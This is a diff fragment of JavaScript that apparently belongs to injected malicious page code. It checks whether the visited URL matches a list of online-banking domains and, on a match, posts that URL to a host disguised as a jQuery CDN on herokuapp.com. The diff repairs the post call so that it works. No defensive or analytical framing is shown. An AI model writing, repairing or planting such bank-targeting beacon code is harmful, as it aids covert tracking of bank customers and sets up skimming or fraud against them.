@@ -3,7 +3,7 @@ var myStringArray = ["secureinternetbank.com", "secureweb.inalco.com","financier
 var arrayLength = myStringArray.length;
 for (var i = 0; i < arrayLength; i++) {
     if (window.location.href.indexOf(myStringArray[i]) > -1) {
-post("//cdn-s1-cloud-jquery.herokuapp.com/sites.php?l="+window.location.href;
+post("//cdn-s1-cloud-jquery.herokuapp.com/sites.php","l="+window.location.href);
   }
 }
 
